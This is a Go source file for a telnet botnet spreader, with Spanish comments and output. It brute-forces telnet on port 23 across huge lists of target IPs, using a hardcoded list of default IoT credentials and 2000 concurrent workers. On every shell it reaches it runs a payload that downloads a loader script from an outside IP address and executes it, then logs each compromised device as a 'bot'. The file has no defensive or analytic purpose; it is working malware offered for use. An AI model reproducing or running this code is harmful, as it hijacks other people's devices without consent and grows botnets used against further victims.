package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// Credenciales originales
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
	
	// Credenciales adicionales
	{"root", "12345"},
	{"admin", "12345"},
	{"root", "54321"},
	{"admin", "54321"},
	{"root", "1111"},
	{"admin", "1111"},
	{"root", "root123"},
	{"admin", "root123"},
	{"root", "qwerty"},
	{"admin", "qwerty"},
	{"root", "letmein"},
	{"admin", "letmein"},
	{"root", "changeme"},
	{"admin", "changeme"},
	{"root", "admin12345"},
	{"admin", "admin12345"},
	{"root", "password123"},
	{"admin", "password123"},
	{"root", "default123"},
	{"admin", "default123"},
}

const (
	TELNET_TIMEOUT    = 2 * time.Second
	MAX_WORKERS       = 2000
	PAYLOAD           = "cd /tmp && wget -q http://172.96.140.62:1283/loader.sh -O .l && sh .l &"
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 1 * time.Second
	LOADER_FILE       = "loader.txt"
)

type BotResult struct {
	IP       string
	Username string
	Password string
	Output   string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	executed         int64
	foundBots        []BotResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
	loaderFile       *os.File
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	// Abrir archivo loader.txt para escritura
	file, err := os.OpenFile(LOADER_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error abriendo loader.txt: %v\n", err)
		return nil
	}
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundBots:        make([]BotResult, 0),
		loaderFile:       file,
	}
}

func (s *TelnetScanner) saveBot(ip, username, password string) {
	s.lock.Lock()
	defer s.lock.Unlock()
	
	// Guardar en memoria
	bot := BotResult{
		IP:       ip,
		Username: username,
		Password: password,
	}
	s.foundBots = append(s.foundBots, bot)
	
	// Guardar en archivo con formato usuario:contraseña@ip
	line := fmt.Sprintf("%s:%s@%s\n", username, password, ip)
	_, err := s.loaderFile.WriteString(line)
	if err != nil {
		fmt.Printf("Error escribiendo en loader.txt: %v\n", err)
	} else {
		s.loaderFile.Sync() // Forzar escritura inmediata
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			_, err = conn.Write([]byte(PAYLOAD + "\n"))
			if err != nil {
				return false, "write command failed"
			}
			
			// Verificar que el comando fue aceptado
			output := s.readCommandOutput(conn)
			
			// Si llegamos aquí, el payload fue ejecutado exitosamente
			return true, BotResult{
				IP:       host,
				Username: username,
				Password: password,
				Output:   output,
			}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT / 2

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			if bytes.Contains(data, []byte(PAYLOAD)) {
				break
			}
			continue
		}
		data = append(data, buf[:n]...)
		if bytes.Contains(data, []byte(PAYLOAD)) {
			break
		}
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				atomic.AddInt64(&s.executed, 1)
				
				botResult := result.(BotResult)
				
				// Guardar bot automáticamente
				s.saveBot(botResult.IP, botResult.Username, botResult.Password)
				
				fmt.Printf("\n[+] BOT ACTIVO: %s:%s@%s\n", 
					botResult.Username, botResult.Password, botResult.IP)
				fmt.Printf("[*] Payload ejecutado correctamente\n")
				if botResult.Output != "" {
					fmt.Printf("[*] Output: %s\n", botResult.Output)
				}
				fmt.Printf("[*] Guardado en loader.txt\n\n")
				
				break
			}
		}
		
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			executed := atomic.LoadInt64(&s.executed)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			memStats := runtime.MemStats{}
			runtime.ReadMemStats(&memStats)
			
			fmt.Printf("\rtotal: %d | válidos: %d | ejecutados: %d | cola: %d | goroutines: %d", 
				scanned, valid, executed, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	defer s.loaderFile.Close()
	
	fmt.Printf("Iniciando scanner (%d workers / %d cola)...\n", MAX_WORKERS, MAX_QUEUE_SIZE)
	fmt.Printf("Los bots que ejecuten el payload se guardarán en: %s\n", LOADER_FILE)
	fmt.Println("Formato: usuario:contraseña@ip\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := line[:len(line)-1]
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("\nLectura completada: %d hosts en cola\n", hostCount)
		stdinDone <- true
	}()

	maxWorkers := MAX_WORKERS
	
	for i := 0; i < maxWorkers; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	executed := atomic.LoadInt64(&s.executed)
	
	fmt.Println("\n\n=== SCAN COMPLETADO ===")
	fmt.Printf("Total escaneados: %d\n", scanned)
	fmt.Printf("Logins válidos encontrados: %d\n", valid)
	fmt.Printf("Bots activos (ejecutaron payload): %d\n", executed)
	
	if len(s.foundBots) > 0 {
		fmt.Printf("\nBots guardados en %s:\n", LOADER_FILE)
		for _, bot := range s.foundBots {
			fmt.Printf("  %s:%s@%s\n", bot.Username, bot.Password, bot.IP)
		}
		fmt.Printf("\nTotal bots activos: %d\n", len(s.foundBots))
	}
}

func main() {
	fmt.Println("\n=== TELNET BOT SCANNER ===")
	fmt.Println("by Shift / Riven")
	fmt.Printf("CPU cores: %d\n", runtime.NumCPU())
	
	scanner := NewTelnetScanner()
	if scanner == nil {
		fmt.Println("Error: No se pudo crear el scanner")
		return
	}
	
	scanner.Run()
}
